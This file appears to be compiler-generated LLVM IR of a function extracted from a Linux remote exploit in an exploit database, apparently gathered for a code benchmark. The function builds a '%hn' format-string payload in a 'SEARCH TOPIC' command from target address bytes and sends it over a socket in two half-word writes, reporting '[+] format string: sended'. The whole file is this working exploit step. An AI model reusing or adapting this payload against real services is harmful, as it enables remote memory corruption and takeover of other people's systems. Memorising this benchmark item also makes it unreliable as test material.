; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1209.c_fmtbuild.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1209.c_fmtbuild.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32 }

@v = common dso_local global %struct.TYPE_2__ zeroinitializer, align 4
@b = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [40 x i8] c"3 SEARCH TOPIC A%c%c%c%c%%.%hdx%%%d$hn\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"[-] send()\00", align 1
@i = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [4 x i8] c"BAD\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"[+] format string: sended\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @fmtbuild(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %9 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 0), align 4
  %10 = and i32 %9, -65536
  %11 = lshr i32 %10, 16
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 0), align 4
  %13 = and i32 %12, 65535
  store i32 %13, i32* %8, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 1), align 4
  %15 = ashr i32 %14, 24
  %16 = and i32 %15, 255
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %3, align 1
  %18 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 1), align 4
  %19 = ashr i32 %18, 16
  %20 = and i32 %19, 255
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* %4, align 1
  %22 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 1), align 4
  %23 = ashr i32 %22, 8
  %24 = and i32 %23, 255
  %25 = trunc i32 %24 to i8
  store i8 %25, i8* %5, align 1
  %26 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 1), align 4
  %27 = and i32 %26, 255
  %28 = trunc i32 %27 to i8
  store i8 %28, i8* %6, align 1
  %29 = load i32*, i32** @b, align 8
  %30 = load i8, i8* %6, align 1
  %31 = zext i8 %30 to i32
  %32 = add nsw i32 %31, 2
  %33 = trunc i32 %32 to i8
  %34 = load i8, i8* %5, align 1
  %35 = load i8, i8* %4, align 1
  %36 = load i8, i8* %3, align 1
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, 36
  %39 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 2), align 4
  %40 = call i32 @snprintf(i32* %29, i32 8, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i8 zeroext %33, i8 zeroext %34, i8 zeroext %35, i8 zeroext %36, i32 %38, i32 %39)
  %41 = load i32, i32* %2, align 4
  %42 = load i32*, i32** @b, align 8
  %43 = load i32*, i32** @b, align 8
  %44 = call i32 @strlen(i32* %43)
  %45 = call i32 @send(i32 %41, i32* %42, i32 %44, i32 0)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %50

47:                                               ; preds = %1
  %48 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %49 = call i32 @exit(i32 1) #3
  unreachable

50:                                               ; preds = %1
  br label %51

51:                                               ; preds = %65, %50
  %52 = load i32, i32* %2, align 4
  %53 = load i32*, i32** @b, align 8
  %54 = call i32 @recv(i32 %52, i32* %53, i32 1023, i32 0)
  store i32 %54, i32* @i, align 4
  %55 = icmp ne i32 %54, -1
  br i1 %55, label %56, label %66

56:                                               ; preds = %51
  %57 = load i32*, i32** @b, align 8
  %58 = load i32, i32* @i, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
  store i32 0, i32* %60, align 4
  %61 = load i32*, i32** @b, align 8
  %62 = call i32* @strstr(i32* %61, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  %63 = icmp ne i32* %62, null
  br i1 %63, label %64, label %65

64:                                               ; preds = %56
  br label %66

65:                                               ; preds = %56
  br label %51

66:                                               ; preds = %64, %51
  %67 = load i32*, i32** @b, align 8
  %68 = call i32 @memset(i32* %67, i32 0, i32 1024)
  %69 = load i32*, i32** @b, align 8
  %70 = load i8, i8* %6, align 1
  %71 = load i8, i8* %5, align 1
  %72 = load i8, i8* %4, align 1
  %73 = load i8, i8* %3, align 1
  %74 = load i32, i32* %8, align 4
  %75 = sub nsw i32 %74, 36
  %76 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @v, i32 0, i32 2), align 4
  %77 = call i32 @snprintf(i32* %69, i32 8, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i8 zeroext %70, i8 zeroext %71, i8 zeroext %72, i8 zeroext %73, i32 %75, i32 %76)
  %78 = load i32, i32* %2, align 4
  %79 = load i32*, i32** @b, align 8
  %80 = load i32*, i32** @b, align 8
  %81 = call i32 @strlen(i32* %80)
  %82 = call i32 @send(i32 %78, i32* %79, i32 %81, i32 0)
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

84:                                               ; preds = %66
  %85 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %86 = call i32 @exit(i32 1) #3
  unreachable

87:                                               ; preds = %66
  br label %88

88:                                               ; preds = %102, %87
  %89 = load i32, i32* %2, align 4
  %90 = load i32*, i32** @b, align 8
  %91 = call i32 @recv(i32 %89, i32* %90, i32 1023, i32 0)
  store i32 %91, i32* @i, align 4
  %92 = icmp ne i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = load i32*, i32** @b, align 8
  %95 = load i32, i32* @i, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i32, i32* %94, i64 %96
  store i32 0, i32* %97, align 4
  %98 = load i32*, i32** @b, align 8
  %99 = call i32* @strstr(i32* %98, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  %100 = icmp ne i32* %99, null
  br i1 %100, label %101, label %102

101:                                              ; preds = %93
  br label %103

102:                                              ; preds = %93
  br label %88

103:                                              ; preds = %101, %88
  %104 = call i32 @puts(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  ret void
}

declare dso_local i32 @snprintf(i32*, i32, i8*, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i32, i32) #1

declare dso_local i32 @send(i32, i32*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @recv(i32, i32*, i32, i32) #1

declare dso_local i32* @strstr(i32*, i8*) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @puts(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
